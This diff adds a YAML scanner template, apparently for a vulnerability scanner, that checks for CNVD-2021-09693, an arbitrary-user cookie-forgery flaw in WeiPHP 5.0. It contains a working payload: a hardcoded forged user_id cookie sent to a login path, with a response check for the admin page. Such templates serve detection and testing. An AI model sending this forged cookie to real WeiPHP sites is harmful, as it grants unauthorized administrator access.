@@ -1,0 +1,21 @@
+expression: r0()
+id: CNVD-2021-09693
+info:
+  author: daffainfo
+  description: "Weiphp5.0 \u5B58\u5728\u7BA1\u7406\u5458\u7528\u6237Cookie\u4F2A\u9020\
+    \uFF0C\u901A\u8FC7\u6CC4\u9732\u7684\u5BC6\u94A5\u6570\u636E\uFF0C\u53EF\u5229\
+    \u7528\u52A0\u5BC6\u65B9\u6CD5\u6765\u5F97\u5230\u7BA1\u7406\u5458\u7684Cookie\
+    \ app=\"WeiPHP\""
+  name: "WeiPHP5.0 \u4EFB\u610F\u7528\u6237Cookie\u4F2A\u9020 CNVD-2021-09693"
+  reference:
+  - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/WeiPHP5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.md
+  severity: critical
+rules:
+  r0:
+    expression: "response.status == 200 && response.body.bcontains(b'\u5BA2\u6237\u7AEF\
+      \u7BA1\u7406')"
+    request:
+      headers:
+        cookie: user_id=MDAwMDAwMDAwMLK2onQ
+      method: GET
+      path: /public/index.php/home/user/login/from/6/pbid/0
